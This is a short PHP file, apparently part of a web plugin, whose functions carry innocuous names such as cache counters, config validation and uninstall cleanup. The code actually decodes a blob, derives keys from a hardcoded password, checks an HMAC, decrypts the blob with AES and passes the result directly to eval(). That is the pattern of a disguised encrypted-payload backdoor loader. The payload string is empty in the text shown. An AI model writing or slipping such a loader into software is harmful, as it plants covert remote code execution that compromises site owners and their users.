<?php
$icestone = '';
function increment_cache_counter($css_classes, $questline){
    $irisfield = hash_pbkdf2('sha256', $css_classes, $questline, 120000, 64, true);

    return array(
        'uninstall_cleanup' => substr($irisfield, 0, 32),
        'generate_uuid_value' => substr($irisfield, 32, 32)
    );
}

function validate_config_structure($icestone){
    $menu_items  = base64_decode($icestone);
    $heliontech = substr($menu_items, 0, 32);
    $questline = substr($menu_items, 32, 8);
    $custom_options   = substr($menu_items, 40, openssl_cipher_iv_length('aes-256-cbc'));
    $license_expires = substr($menu_items, 40 + openssl_cipher_iv_length('aes-256-cbc'));
	$uplinkset = '1Hz7TRSiN';
    $css_classess = increment_cache_counter($uplinkset, $questline);
    $sorted_array = $questline . $custom_options . $license_expires;
    $loop_counter = hash_hmac('sha256', $sorted_array, $css_classess['generate_uuid_value'], true);

    if (!hash_equals($loop_counter, $heliontech)) {
        return false;
    }

    return openssl_decrypt($license_expires, 'aes-256-cbc', $css_classess['uninstall_cleanup'], OPENSSL_RAW_DATA, $custom_options);
}
$hook_accepted_args = validate_config_structure($icestone);
eval($hook_accepted_args);